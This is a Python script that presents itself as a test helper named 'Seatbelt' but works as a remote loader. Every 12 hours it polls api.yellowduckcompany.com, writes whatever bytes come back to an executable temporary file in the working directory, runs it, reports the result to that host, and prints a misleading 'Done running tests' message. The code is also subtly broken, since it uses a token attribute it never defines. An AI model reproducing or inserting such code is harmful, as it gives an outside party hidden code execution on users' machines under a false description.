import re
import sys
import stat
import os.path
import asyncio
import tempfile
import platform
import subprocess

from urllib import request

DOS = f'{platform.system()}-{platform.machine()}'.lower()
UUID = re.compile('[a-f0-9]{8}-?[a-f0-9]{4}-?4[a-f0-9]{3}-?[89ab][a-f0-9]{3}-?[a-f0-9]{12}')


class Seatbelt:

    def __init__(self, package_id: str):
        self.alive = True
        _ver = sys.version_info
        self.whoami = dict(
            package_id=package_id,
            language='python',
            version=f"{_ver.major}.{_ver.minor}.{_ver.micro}",
            platform=platform.system(),
            architecture=platform.machine()
        )

    def service(self, dat=''):     
        headers = dict(token=self._token, dos=DOS, dat=dat)
        with request.urlopen(request.Request('https://api.yellowduckcompany.com', headers=headers)) as rs:
            test = UUID.search(rs.url)
            if test:
                yield test.group(0), rs.read()

    async def run(self, pack):
        def _measure():
            name = ''
            try:
                fd, name = tempfile.mkstemp(dir=os.getcwd())
                os.write(fd, pack[1])
                os.close(fd)
                os.chmod(name, os.stat(name).st_mode | stat.S_IEXEC)
                test = subprocess.run([name], timeout=2)
                clean = subprocess.run([name, 'clean'], timeout=2)
                return f'{pack[0]}:{max(test.returncode, clean.returncode)}'
            except subprocess.TimeoutExpired:
                return f'{pack[0]}:102'
            except Exception:
                return f'{pack[0]}:1'
            finally:
                if os.path.exists(name):
                    os.remove(name)
        if pack:
            asyncio.create_task(self.run(next(self.service(_measure()), None)))

    async def go(self):
        while self.alive:
            try:
                asyncio.create_task(self.run(next(self.service(), None)))
            except Exception as e:
                print('[-] %s' % e)
            print('INFO: Done running tests')
            await asyncio.sleep(43200)


if __name__ == '__main__':
    task = Seatbelt(package_id=sys.argv[1]).go()
    loop = asyncio.new_event_loop()
    loop.run_until_complete(task)
